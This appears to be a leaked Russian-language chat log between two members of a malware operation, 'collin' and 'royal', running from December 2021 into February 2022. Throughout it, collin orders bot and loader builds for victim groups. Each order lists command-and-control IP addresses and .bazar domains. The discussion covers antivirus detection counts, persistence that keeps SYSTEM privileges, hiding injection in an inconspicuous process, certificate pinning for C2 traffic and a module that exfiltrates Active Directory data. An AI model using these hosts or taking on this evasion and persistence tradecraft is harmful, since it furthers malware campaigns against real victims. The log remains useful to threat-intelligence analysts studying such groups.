[15.12.21 12:08:48] collin:		по сравнению с остальными svchost, в Process Explorer
[15.12.21 12:09:08] collin:		это можно изменить, не смотрел?
[15.12.21 12:11:09] royal:		А что цвет означает в process explorer?
[15.12.21 12:11:51] collin:		оранжевый цвет процесса - сервисы
[15.12.21 12:13:11] collin:		возможно если parent process у него менять на services.exe - изменится, а может там другие критерии
[15.12.21 12:13:49] royal:		И что они все сервисы? Их не мерено запущено в системе.
[15.12.21 12:14:15] collin:		у всех родитель services.exe
[15.12.21 12:15:30] royal:		Да
[15.12.21 13:20:09] royal:		Я отошел.
[15.12.21 13:20:20] collin:		+
[16.12.21 13:52:33] collin:		Привет!
[16.12.21 13:53:08] collin:		сделай сборки новые
[16.12.21 13:53:21] collin:		1) группа 16 - x64, rundll32(CheckDevice)
[16.12.21 13:53:32] collin:		2) группа - g4 - x64, regsvr32
[16.12.21 13:53:40] collin:		```
адреса (домены) первого этапа
бот:
87.120.254.145
87.120.254.123
87.120.254.81
87.121.52.223

лоадер:
87.121.52.223
87.120.254.123
87.120.254.81
87.120.254.145

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[16.12.21 13:53:59] collin:		группу 16 направь odis, g4 - wild
[17.12.21 07:11:50] collin:		привет!
[17.12.21 07:19:09] royal:		Привет.
[17.12.21 07:21:11] collin:		включи отр
[17.12.21 07:22:22] collin:		первый вопрос - можешь настроить здесь e2e?
[17.12.21 07:22:45] collin:		только у тебя не работает он, со всеми остальными норм
[17.12.21 07:23:24] collin:		второе - вчера тестили крипт g4, вот такая картина в задаче BITS получилась
[17.12.21 07:23:41] collin:		```
BITSADMIN version 3.0
BITS administration utility.
(C) Copyright Microsoft Corp.

GUID: {CEBDF270-8A65-4B82-9CD8-6A3AFC175E65} DISPLAY: 'Telemetry update'
TYPE: DOWNLOAD STATE: ERROR OWNER: DESKTOP-U970893\tstuser1
PRIORITY: NORMAL FILES: 0 / 1 BYTES: 0 / UNKNOWN
CREATION TIME: 12/16/2021 8:32:11 AM MODIFICATION TIME: 12/16/2021 8:32:13 AM
COMPLETION TIME: UNKNOWN ACL FLAGS:
NOTIFY INTERFACE: UNREGISTERED NOTIFICATION FLAGS: 2
RETRY DELAY: 10800 NO PROGRESS TIMEOUT: 0 ERROR COUNT: 1
PROXY USAGE: PRECONFIG PROXY LIST: NULL PROXY BYPASS LIST: NULL
ERROR FILE:    https://microsoft.com/telemetry/update.exe -> C:\Users\tstuser1\AppData\Local\Temp\14C6.tmp
ERROR CODE:    0x80190194 - HTTP status 404: The requested URL does not exist on the server.
ERROR CONTEXT: 0x00000005 - The error occurred while the remote file was being processed.
DESCRIPTION:
JOB FILES:
        0 / UNKNOWN WORKING https://microsoft.com/telemetry/update.exe -> C:\Users\tstuser1\AppData\Local\Temp\14C6.tmp
NOTIFICATION COMMAND LINE: 'C:\Windows\System32\rundll32.exe' 'C:\Windows\System32\rundll32.exe ,DllRegisterServer {CEBDF270-8A65-4B82-9CD8-6A3AFC175E65}'
owner MIC integrity level: MEDIUM
owner elevated ?           false

Peercaching flags
         Enable download from peers      :false
         Enable serving to peers         :false

CUSTOM HEADERS: NULL
```
[17.12.21 07:24:56] collin:		почему такое может быть? У тебя же должна быть проверка
[17.12.21 07:25:34] collin:		```
2.2. для метода 1.3 дополнительно проверяется, что имя файла не указывает на модуль rundll32.exe или regsvr32.exe, размещенных в папках %SystemRoot%\System32 или %SystemRoot%\SysWOW64.
```
[17.12.21 07:25:35] royal:		Они что из dll exe сделали?
[17.12.21 07:25:49] royal:		Вот по этому и косяк.
[17.12.21 07:25:50] collin:		нет длл крипт обычный
[17.12.21 07:27:08] collin:		правда криптовщик потом сказал что был косяк в крипте, в следующем логированном это воспроизвести не удалось
[17.12.21 07:27:22] collin:		но у них эти косяки не редко бывают, поэтому проверка должна быть на все случае
[17.12.21 07:27:41] collin:		у меня подозрение что проверка хромает, проверь этот момент
[17.12.21 07:27:48] royal:		Косяк в крипте.
[17.12.21 07:29:21] royal:		e2e не могу настроить.
[17.12.21 07:29:31] royal:		Он тупо не работает со всеми.
[17.12.21 07:29:42] royal:		TEST
[17.12.21 07:29:46] royal:		TEST
[17.12.21 07:29:47] royal:		TEST
[17.12.21 07:30:11] royal:		TEST
[17.12.21 07:30:17] royal:		Работает
[17.12.21 07:30:19] royal:		?
[17.12.21 07:30:24] collin:		текст вижу
[17.12.21 07:30:32] collin:		а мой видно?
[17.12.21 07:30:35] royal:		С тобой работает.
[17.12.21 07:30:39] collin:		отлично!
[17.12.21 08:01:20] collin:		сделай сборку группа 31
[17.12.21 08:01:24] collin:		x64, regsvr32
[17.12.21 08:01:30] collin:		```
адреса (домены) первого этапа
бот:
31.13.195.154
31.13.195.140
31.13.195.126
87.120.8.117

лоадер:
87.120.8.117
31.13.195.140
31.13.195.154
31.13.195.126

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[17.12.21 08:01:34] collin:		направь wild
[20.12.21 09:14:43] collin:		Привет!
[20.12.21 09:15:42] royal:		Привет.
[20.12.21 09:15:56] collin:		есть такая задача:
[20.12.21 09:16:31] collin:		нужно сделать сборку с грязным по статике АВ лоадером - найди за последнее время день, когда у тебя детекты были, можешь уточнить у тестеровщика - он ведет учет. Можно просто сборку (исходник) месячной давности, главное чтобы были детекты. Сделай с ней сборку для своей тестовой группы. Сборку rundll32(NewCode) давай, x64. Направь сборку мне. Детектов чем больше тем лучше, желательно чтобы были на ESET и/или BitDefender.
[20.12.21 09:16:59] collin:		```
адреса (домены) первого этапа
бот:
87.121.52.130
87.120.254.119
87.121.52.126
31.13.195.113

лоадер:
31.13.195.113
87.120.254.119
87.121.52.130
87.121.52.126

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[20.12.21 09:17:05] collin:		вот с этими адресами собери
[20.12.21 09:17:15] royal:		А можно regsvr32?
[20.12.21 09:17:30] royal:		Там могу 10 детектов чтобы  было.
[20.12.21 09:17:44] collin:		да давай regsvrv32 тогда
[20.12.21 09:17:48] royal:		На функцию DllRegisterServer хорошо детекты идут.
[20.12.21 09:51:39] royal:		-----BEGIN PGP MESSAGE-----

hQIMA/SQT1otRH73AQ/+LbzgH4dIdSh69CrEzuefI/GMz3jWZRndjHGMk9IbEfez
G6b/Zi6kTGuwLa1AuoLj9FLWKadg1pIn5zLaOj6j5a44ontneI0DmZevld8tHia4
M7i3K1b8BeRQMW5rZQs7QxrVjuXVutTkwvp8/yBWqGoVA38NwxU4/jLaBf5GKtmn
fHR9MyG2xYIJuwxTCRQ5azfLn4POP/WltdhFvjFWOUbmp2nLE+MATdgRy+aFNwG0
DxtMtGwV0bVY86ZN4NGoAWL1a0+AuPcPD77x6w+nqehSNMUBnvmSICekURKhH7jT
zxxNcBM3u1NxljJAtYzoKSE+OW+yrNZS/iEPfKnBigbOEHiKKd/AGoNRpUpWm5Fo
EKsE43JGt1D0TcyIhRA/NtvNa8duM2ndSIgT8GzG5BO8pFoxzcoeZHOPXhq/kzjd
wYmHuH33VCOMHd7BWRVGYrsCb3cgno4kARIYjzpvV+cmG2JFVH5zVFDVUyBSMV47
M1EO2SLUrLU6AxnetVyfWQl/C287hvaLVH+LUZ+EnyjrfrIhf2brrh4f3b8i295b
zFEh3jz0GhaiEKXCYoM44IJNCrIf7ZiE2MibdSzJahygIPcB920uvriFCB3CNgOV
rL+s4y7za5pV+Mh80HexZWIcrQR2bbc6u/U8LRfK1Cdo7JnHL4g04lv80VPME3TS
wAUBYp4YspMjpQ3rhhqQfo25YQMwzbjZHJAzCdmw804SIPEDvtNyj8YQHqTlEOHY
LRo5BvohvEs68Z4iLBtXyaSxg+NZU8wjqMU18g8Bwp8BcZe3ekwLbClLfsIUq4+W
WRcEEeo3m0cNtWjJkoJ0UUqcER6d0KNrVU/u68NEpxoHggJITqKVM/M7bStJjG8G
uXeM+omwkk6ilLR8NtMoGtJHxrVAQi9lGd9GKL3tuUiVJ/avwAU9Zb9xWe85XloF
bMQpuxQPOg==
=wHyj
-----END PGP MESSAGE-----
[20.12.21 09:51:44] royal:		12 детектов.
[20.12.21 10:12:40] collin:		+
[20.12.21 13:24:27] collin:		сделай сборку группа 57
[20.12.21 13:24:34] collin:		x64, LoadLibrary
[20.12.21 13:24:58] collin:		адреса и базары те же что сегодня давал
[20.12.21 13:25:00] collin:		направь wild
[20.12.21 13:47:40] royal:		Имя функции для экспорта?
[20.12.21 13:55:02] collin:		сделай такую: `btla`
[22.12.21 09:17:01] collin:		Привет!
[22.12.21 09:17:05] collin:		возьми в работу таск 479
[22.12.21 09:17:10] collin:		теперь он в первую очередь нужен
[22.12.21 09:19:09] royal:		OK.
[22.12.21 09:26:20] collin:		Сделай сборку группа 16
[22.12.21 09:26:36] collin:		x64, rundll32(EproyAklW)
[22.12.21 09:26:39] collin:		адреса и базары:
[22.12.21 09:26:45] collin:		```
адреса (домены) первого этапа
бот:
103.208.86.176
103.208.86.177
103.208.86.179
103.208.86.182

лоадер:
103.208.86.179
103.208.86.182
103.208.86.176
103.208.86.177

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[22.12.21 09:26:51] collin:		направь odis
[22.12.21 13:55:10] collin:		Насчет таска 479 - добавил уточнение по первому пункту:
[22.12.21 13:55:40] collin:		```
Права системной учетной записи должны сохраняться (наследоваться):
1) при закрепе лоадера и последующем автозапуске из закрепа. Если создание закрепа с системными правами труднореализуемо, то в первой версии можно сделать закреп с правами администратора (Integrity level = High).
```
[22.12.21 13:56:09] royal:		Ничего менять не надо. Вот сейчас работает как SYSTEM
[22.12.21 13:56:30] royal:		От кого запустил от того и закрепился.
[22.12.21 13:58:12] royal:		А что ошибки какие были если такое задание?
[22.12.21 13:58:52] royal:		System integrity process
[22.12.21 13:59:01] royal:		В отчете на команду 1.
[22.12.21 13:59:13] royal:		В моем боте.
[22.12.21 13:59:53] collin:		подумал возможны сложности с этим, ну если в BITS работает то хорошо
[22.12.21 14:00:08] collin:		в одной сборке закреп через реестр ключ автозапуска, там думаю с этим проблемы будут
[22.12.21 14:00:42] royal:		Окно вызлазить будет я думаю что надо подтвердить запуск.
[22.12.21 14:01:19] royal:		А может нет, пишут же туда под SYSTEM
[23.12.21 08:05:58] collin:		Привет!
[23.12.21 08:06:01] collin:		сделай сборку группа 16
[23.12.21 08:06:16] collin:		x64, rundll32(SieletW)
[23.12.21 08:06:26] collin:		```
адреса (домены) первого этапа
бот:
94.140.114.201
176.103.58.142
5.135.255.247
192.119.93.26

лоадер:
5.135.255.247
192.119.93.26
94.140.114.201
176.103.58.142

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[23.12.21 08:06:31] collin:		направь odis
[23.12.21 10:36:17] collin:		сделай еще сборки:
[23.12.21 10:36:28] collin:		g41 generic
g7 rundll32(frete)
[23.12.21 10:36:30] collin:		x64
[23.12.21 10:36:36] collin:		```
адреса (домены) первого этапа
бот:
45.41.204.148
91.92.109.172
91.92.109.147
31.13.195.133

лоадер:
91.92.109.147
31.13.195.133
45.41.204.148
91.92.109.172

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[23.12.21 10:36:39] collin:		направь nick
[23.12.21 11:49:47] royal:		g41 нету у меня.
[23.12.21 11:50:30] collin:		добавил проверь
[23.12.21 11:50:49] royal:		Появилась.
[27.12.21 08:51:30] collin:		привет!
[27.12.21 08:51:34] collin:		сделай сборку группа 57
[27.12.21 08:52:06] collin:		x64, rundll32(gigi)
[27.12.21 08:52:16] collin:		```
адреса (домены) первого этапа
бот:
176.103.58.142
5.135.255.247
192.119.93.26
94.140.114.201

лоадер:
5.135.255.247
192.119.93.26
94.140.114.201
176.103.58.142

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[27.12.21 08:52:30] collin:		направь wild
[27.12.21 08:52:46] royal:		Привет. Принял.
[27.12.21 11:37:18] collin:		сделай сборки:
[27.12.21 11:37:32] collin:		1) g7 - x64, rundll32(frete)
[27.12.21 11:37:40] collin:		2) g9 - x64, rundll32(reteo)
[27.12.21 11:37:49] collin:		```
адреса (домены) первого этапа
бот:
103.208.86.205
103.208.86.210
103.208.86.211
103.208.86.221

лоадер:
103.208.86.211
103.208.86.221
103.208.86.205
103.208.86.210

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[27.12.21 11:37:53] collin:		направь nick
[27.12.21 12:49:14] collin:		сделай еще сборку группа 43
[27.12.21 12:49:34] collin:		сделай еще сборку группа g43 - x64, generic
[27.12.21 12:49:45] collin:		адреса и базары такие же как для g7 g9
[27.12.21 12:49:47] collin:		направь nick
[30.12.21 08:24:54] royal:		Привет. Что по выходным? Завтра выходной и как на праздниках?
[30.12.21 08:25:49] collin:		привет!
[30.12.21 08:25:53] collin:		напишу сегодня, чуть позднее
[30.12.21 08:25:58] royal:		OK.
[30.12.21 12:38:14] collin:		сделай сборки:
[30.12.21 12:38:20] collin:		g7 rundll32(frete)
g43 generic
g9 rundll32(reteo)
[30.12.21 12:38:31] collin:		```
адреса (домены) первого этапа
бот:
103.208.86.228
103.208.86.233
103.208.86.234
103.208.86.235

лоадер:
103.208.86.234
103.208.86.235
103.208.86.228
103.208.86.233

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[30.12.21 12:38:34] collin:		направь nick
[30.12.21 12:39:16] collin:		x64 все
[30.12.21 12:50:12] collin:		так отбой, сборки не нужны эти
[30.12.21 13:24:13] collin:		завтра и на следующей неделе задач по БК не будет
отдыхай или работай в свободном графике
в штатном режиме выходи на работу с 10 января
по возможности с 4 января каждый день проверяй рабочие чаты, на предмет важных сообщений
[30.12.21 13:24:36] royal:		Понял.
[10.01.22 10:57:26] collin:		Привет!
[10.01.22 10:57:36] collin:		сделай сборку группа g15, x64
[10.01.22 10:57:43] collin:		regsvr32
[10.01.22 10:57:51] collin:		```
адреса (домены) первого этапа
бот:
148.163.42.203
45.15.131.126
193.169.86.84
45.41.204.150

лоадер:
193.169.86.84
45.41.204.150
148.163.42.203
45.15.131.126

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[10.01.22 10:57:56] collin:		направь wild
[10.01.22 10:58:08] royal:		Принял.
[10.01.22 14:40:54] royal:		Я отошел.
[10.01.22 14:41:20] collin:		+
[11.01.22 07:27:30] collin:		Привет!
[11.01.22 07:29:04] collin:		по задаче с наследованием админских прав, помниться при инжекте бота в процесс браузера high integrity level не сохраняется
[11.01.22 07:29:27] collin:		тебе удалось это решить, или остановился на использовании другого процесса для инжекта?
[11.01.22 07:58:35] royal:		Другой процесс использую, браузер с админскими правами палевно смотрится.
[11.01.22 08:06:38] collin:		ок
[11.01.22 08:06:43] collin:		сделай сборки:
[11.01.22 08:06:53] collin:		g7 rundll32(frete)
g9 rundll32(reteo)
g43 generic
[11.01.22 08:06:56] collin:		x64
[11.01.22 08:07:24] collin:		```
адреса (домены) первого этапа
бот:
5.255.103.36
91.201.202.138
185.99.133.67
188.127.249.22

лоадер:
185.99.133.67
188.127.249.22
5.255.103.36
91.201.202.138

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[11.01.22 08:07:29] collin:		направь тшсл
[11.01.22 08:07:31] collin:		nick
[11.01.22 08:18:44] collin:		уточнение - g9 generic нужна
[11.01.22 08:18:48] collin:		rundll32 не надо
[11.01.22 08:20:47] royal:		g7 rundll32(frete)
g9 generic
g43 generic
[11.01.22 08:22:39] collin:		+
[11.01.22 13:32:32] collin:		сделай сборку группа 18
[11.01.22 13:32:34] collin:		x64
[11.01.22 13:32:50] collin:		в двух вариантах: 1) generic 2) regsvr32
[11.01.22 13:33:02] collin:		```
адреса (домены) первого этапа
бот:
31.13.195.87
31.13.195.90
87.120.37.173
87.121.52.79

лоадер:
87.121.52.79
31.13.195.90
87.120.37.173
31.13.195.87

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[11.01.22 13:33:05] collin:		направь odis
[13.01.22 08:37:37] collin:		Привет!
[13.01.22 08:37:39] collin:		сделай сборки:
[13.01.22 08:37:55] collin:		g9 generic
g9 rundll32(reteo)
g43 generic
g7 rundll32(frete)
[13.01.22 08:37:57] collin:		x64
[13.01.22 08:38:02] collin:		```
адреса (домены) первого этапа
бот:
31.13.195.87
31.13.195.90
87.120.37.173
87.121.52.79

лоадер:
87.121.52.79
31.13.195.90
87.120.37.173
31.13.195.87

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[13.01.22 08:38:07] collin:		направь nick
[17.01.22 10:09:47] collin:		привет!
[17.01.22 10:11:01] collin:		готовь сборки
[17.01.22 10:11:12] collin:		ч64
[17.01.22 10:11:16] collin:		x64
[17.01.22 10:11:17] collin:		g9 generic
g9 rundll32(reteo)
g43 generic
g7 rundll32(frete)
[17.01.22 10:11:25] collin:		```
адреса (домены) первого этапа
бот:
94.140.113.53
185.163.45.95
144.217.50.242
5.39.63.103

лоадер:
144.217.50.242
5.39.63.103
94.140.113.53
185.163.45.95

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[17.01.22 10:11:29] collin:		направь nick
[20.01.22 07:19:23] collin:		привет!
[20.01.22 07:19:49] royal:		Привет.
[20.01.22 07:19:57] collin:		добавил новый таск 805, делай его в приоритете
[20.01.22 07:20:08] collin:		```
A6nd8KR4b$Ns7ke8BA4kg4DnkeNS
https://privatlab.com/s/v/6GakxpJJowh2YbL9GXam
```
[20.01.22 07:20:15] collin:		это материалы к таску
[20.01.22 07:22:26] royal:		Принял.
[20.01.22 09:00:57] royal:		Публичный ключ сертификата проверяется так?
[20.01.22 09:01:52] royal:		Самому его получить запросом и запомнить?
[20.01.22 09:11:28] collin:		запросом получаешь сертификат или его хеш, который сравнивается с хардкод-значением
[20.01.22 09:11:52] collin:		для получения значений можно это в отдельную утилиту вынести
[20.01.22 09:12:17] collin:		какой конкретно сервер будем использовать - уточню, позднее дам
[20.01.22 09:12:23] royal:		А в браузере можно посмотреть сертификат сайта.
[20.01.22 09:13:22] collin:		ну в браузере ты его увидешь, но надо сравнивать в коде
[20.01.22 09:14:00] royal:		С чем сравнивать я имею ввиду, можно в браузере взять.
[20.01.22 09:14:01] collin:		поэтому должен быть одинаковый алгоритм для получения признака - что для хардкод-значения, что в рабочих модулях
[20.01.22 09:19:53] collin:		сделай сборку
[20.01.22 09:20:08] collin:		группа 57 rundll32(dwpyt), x64
[20.01.22 09:20:18] collin:		```
адреса (домены) первого этапа
бот:
104.143.94.101
162.55.32.153
80.71.158.106
194.15.113.155

лоадер:
80.71.158.106
194.15.113.155
104.143.94.101
162.55.32.153

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[20.01.22 09:20:21] collin:		направь wild
[20.01.22 09:54:28] collin:		сделай сборки x64:
[20.01.22 09:54:40] collin:		g9 generic
g9 rundll32(reteo)
g43 generic
g7 rundll32(frete)
[20.01.22 09:54:48] collin:		```
адреса (домены) первого этапа
бот:
188.127.235.177
23.160.193.221
5.255.102.10
148.163.42.213

лоадер:
148.163.42.213
5.255.102.10
188.127.235.177
23.160.193.221

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[20.01.22 09:54:53] collin:		направь nick
[20.01.22 11:05:34] collin:		у тебя экспорт в 57:
[20.01.22 11:05:36] collin:		```
DLL functions:
    dwpyt
    initBuffer
    uninitBuffer
    updateBuffer
```
[20.01.22 11:06:08] collin:		функции кроме dwpyt мусорные
[20.01.22 11:06:21] collin:		то есть если их переименовывать рандомно при криптовании, на работоспосоность не скажется?
[20.01.22 11:22:47] royal:		Не скажется.
[21.01.22 07:38:30] collin:		привет!
[21.01.22 07:38:40] collin:		сделай сборку x64 g15 generic
[21.01.22 07:38:48] collin:		```
адреса (домены) первого этапа
бот:
103.208.86.245
188.127.251.111
23.160.193.119
80.71.158.22

лоадер:
23.160.193.119
80.71.158.22
103.208.86.245
188.127.251.111

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[21.01.22 07:38:51] collin:		направь wild
[21.01.22 10:36:12] collin:		сделай сборку группа 16
[21.01.22 10:36:24] collin:		x64, rundll32(setvstate)
[21.01.22 10:36:30] collin:		```
адреса (домены) первого этапа
бот:
104.143.94.101
162.55.32.153
80.71.158.106
194.15.113.155

лоадер:
80.71.158.106
194.15.113.155
104.143.94.101
162.55.32.153

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[21.01.22 10:36:34] collin:		направь odis
[24.01.22 10:32:01] collin:		привет!
[24.01.22 10:32:03] collin:		сделай сборки:
[24.01.22 10:32:17] collin:		1) группа 16, x64, rundll32(gssbp)
[24.01.22 10:32:22] collin:		направь odis
[24.01.22 10:32:50] collin:		2) группа 57, x64, rundll32(trueks)
[24.01.22 10:32:51] collin:		направь wild
[24.01.22 10:33:02] collin:		```
адреса (домены) первого этапа
бот:
87.120.8.129
87.120.8.163
31.13.195.125
91.92.109.141

лоадер:
91.92.109.141
87.120.8.163
87.120.8.129
31.13.195.125

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[24.01.22 10:33:16] royal:		Принял. Принял.
[24.01.22 10:51:05] collin:		еще сделай сборки x64:
[24.01.22 10:51:24] collin:		g9 generic
g9 rundll32(reteo)
g43 generic
g7 rundll32(frete)
[24.01.22 10:51:40] collin:		адреса и базары для них другие:
[24.01.22 10:51:57] collin:		```
адреса (домены) первого этапа
бот:
91.92.109.65
87.120.254.21
87.120.8.248
87.120.8.202

лоадер:
87.120.8.248
91.92.109.65
87.120.254.21
87.120.8.202

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[24.01.22 10:52:00] collin:		направь nick
[24.01.22 12:39:43] collin:		что по сборке группа 16?
[24.01.22 12:41:34] royal:		Сделана.
[24.01.22 12:41:46] collin:		выдал?
[24.01.22 12:42:36] royal:		Выдал.
[24.01.22 12:43:58] collin:		Одису?
[24.01.22 12:44:05] collin:		давно?
[24.01.22 12:44:19] collin:		продублируй ему, он говорит не получал
[24.01.22 12:44:44] royal:		Только что.
[24.01.22 13:06:30] collin:		что по сборкам группы g9 g43 g7 ?
[24.01.22 13:07:04] royal:		Делаю.
[24.01.22 13:07:40] collin:		в чем задержка?
[24.01.22 13:08:45] royal:		Ни в чем.
[24.01.22 13:08:58] royal:		Только начал делать их.
[25.01.22 07:19:45] collin:		привет!
[25.01.22 07:19:47] collin:		сделай сборку
[25.01.22 07:19:53] collin:		x64 g15 regsvr32
[25.01.22 07:20:03] collin:		```
адреса (домены) первого этапа
бот:
87.120.8.179
87.120.254.33
87.120.37.114
87.120.8.198

лоадер:
87.120.37.114
87.120.8.198
87.120.8.179
87.120.254.33

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[25.01.22 07:20:06] collin:		направь wild
[25.01.22 09:23:45] royal:		Что то нету wild?
[25.01.22 09:24:03] royal:		Он в jabber есть онлайн?
[25.01.22 09:24:35] collin:		сейчас нет
[25.01.22 09:24:58] collin:		он сказал отлучиться временно, через полчаса должен вернуться
[26.01.22 07:45:21] collin:		Привет!
[26.01.22 07:45:30] collin:		сделай сборку группа 57, x64, rundll32(vchuudsa)
[26.01.22 07:45:42] collin:		```
адреса (домены) первого этапа
бот:
23.160.193.12
45.41.204.151
80.71.158.109
185.99.132.109

лоадер:
80.71.158.109
185.99.132.109
23.160.193.12
45.41.204.151

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[26.01.22 07:45:45] collin:		направь wild
[27.01.22 07:12:16] collin:		Привет!
[27.01.22 07:12:34] collin:		напиши какие еще у тебя были проекты в нашей команде
[27.01.22 07:12:44] collin:		кроме БК, криптосигн и криптера
[27.01.22 07:25:04] royal:		Привет. ADll, dl1 и портирование llvm obfuscator 4 на llvm 10.
[27.01.22 07:27:35] collin:		ADll это что?
[27.01.22 07:28:27] royal:		"Модуль предназначен для выгрузки данных Active Directory и реестра Windows
на сервер-хранилище."
[27.01.22 07:33:07] collin:		+
[27.01.22 07:33:45] collin:		сделай сборку x64, группа 57, rundll32(hgh56kd43s)
[27.01.22 07:33:53] collin:		```
адреса (домены) первого этапа
бот:
23.160.193.12
45.41.204.151
80.71.158.109
185.99.132.109

лоадер:
80.71.158.109
185.99.132.109
23.160.193.12
45.41.204.151

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[27.01.22 07:33:57] collin:		направь wild
[27.01.22 07:58:43] collin:		уточнение - сборку wild не надо, направь nick
[27.01.22 08:44:20] collin:		сделай сборки x64:
[27.01.22 08:44:31] collin:		g15 generic
g15 regsvr32
[27.01.22 08:44:44] collin:		```
адреса (домены) первого этапа
бот:
194.38.20.33
23.160.193.199
45.41.204.153
23.160.193.62

лоадер:
45.41.204.153
23.160.193.62
194.38.20.33
23.160.193.199

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[27.01.22 08:44:48] collin:		скинь мне
[27.01.22 09:29:59] royal:		-----BEGIN PGP MESSAGE-----

hQIMA/SQT1otRH73ARAAqpBfjNnfGo2bgdR9GLXYRPoGjF5mpz4gd02drb6VLnNF
2u6iSH9pgL6ZKUHxwDzlUQMgpp/hcgf8D8wzUMlIh5t+GdaBeXUO4y5NodSZz3Oe
HhVQZsu60mjECIn8iODJwKMmDjE9dboWpD0xaceMbR1Db7YO1djgFgEVQIvdUtVG
mPpbxfNXknqyV2jdPabiB+ikgG7uYYQ6KNxItXsW+ZRiLG44SowWmWY5sGs/PMTb
I/zgwLVSJtx1lKs5arDSO1+qMyfl+DQ7HQaHK6uKs+uxlSlqm3yuWAk6J7ZPNka9
pBu9r0ZM3bbzzzXOD+h+1yTIDVclUdmbfCcnrtcWS9wmcDco551EmonAZ7elMzUE
u+rS7pIa9u76zKu8FSfyYe7GRBox8PebhhUSJpN6+SGrAp15MlnSXcYIicZJ8Jvl
Zz0d0BjC1yl+aTv+CciNJGIPmP3ej3LGP9RtTzn+UWxTUIT1hBEnWdmnsFlnUsnY
GJ7zeWRnwE3MPJuooN7xqR1WjqxweNRSFtMWz6v12GF9llpNLGoN3YwL0HE56s6U
Slu3Qul7Sv/7QUl/EZ5AhMszWeWYRe6hzqdWhNXNX/DDqeoKiKcr69zl5TNmKuah
jNi0IErfUl6zokmjLqoFmAGcpVSAwSiCQGZ1HWg/qcWTTMTB5cH3CU1FBZsp+GXS
wAUBzNs4GQHB0o52TuexAyk8Uz7YFRyr6oAnU+Li/apg4xk9EOQK2Cjr9Q/ogN07
xRbGPnvCyF5nb7UNT7asTtven6vekJnx2c8HX3VH+/sG9BEFPMy3nL0MbXiaIEM6
IV3kOngB1AO6SQ4mtFGGkDjQPTXqWb9ISPHk8E0ptYic4lxUtF4hfRIT/8J272V4
UGHQM9VhsL1sGxiSPaSHgkl+DKpwvCveX2QYnuTeQ6p8vUmQ7wpkKqwbSowv5qPb
N2ykGRbpiw==
=aZIu
-----END PGP MESSAGE-----
[27.01.22 09:30:03] royal:		2 детекта.
[27.01.22 09:42:27] collin:		+
[27.01.22 13:54:06] royal:		Я отошел.
[27.01.22 13:55:26] collin:		+
[28.01.22 09:41:01] royal:		Привет. Тут баг в админке нашел.
Пример бот a1eb61a5e4f2086209590931cb158eb6, заходим в actions расурываем крестиком команду runbat channel 600, верстка страницы слетает.
[28.01.22 09:44:34] collin:		Привет!
[28.01.22 09:44:37] collin:		на основной админке?
[28.01.22 09:44:44] royal:		Да.
[28.01.22 09:45:49] collin:		действительно, оформлю
[28.01.22 09:47:39] collin:		`заходим в actions` - история команд имеешь ввиду?
[28.01.22 09:48:36] royal:		Да.
[31.01.22 07:42:18] collin:		Привет!
[31.01.22 07:42:20] collin:		сделай сборку
[31.01.22 07:42:34] collin:		x64, группа 57, rundll32(hdusie32)
[31.01.22 07:42:41] collin:		```
адреса (домены) первого этапа
бот:
185.99.132.248
194.40.243.33
23.160.193.217
45.14.226.23

лоадер:
23.160.193.217
45.14.226.23
185.99.132.248
194.40.243.33

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[31.01.22 07:42:44] collin:		направь wild
[31.01.22 07:45:21] collin:		просили срочно, готовь без задержек
[31.01.22 08:26:51] collin:		сделай также сборку группа 16, x64, rundll32(drusvcw)
[31.01.22 08:26:53] collin:		адреса и базары те же
[31.01.22 08:26:55] collin:		направь odis
[01.02.22 10:30:07] collin:		Привет!
[01.02.22 10:30:12] collin:		сделай сборку группа 16
[01.02.22 10:30:15] collin:		x64 generic
[01.02.22 10:30:19] collin:		```
адреса (домены) первого этапа
бот:
185.99.132.248
194.40.243.33
23.160.193.217
45.14.226.23

лоадер:
23.160.193.217
45.14.226.23
185.99.132.248
194.40.243.33

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[01.02.22 10:30:22] collin:		направь odis
[01.02.22 10:42:55] collin:		```
Нужно организовать связь в сети Tox. Сейчас как резервный канал, в дальнейшем возможно он станет основным.
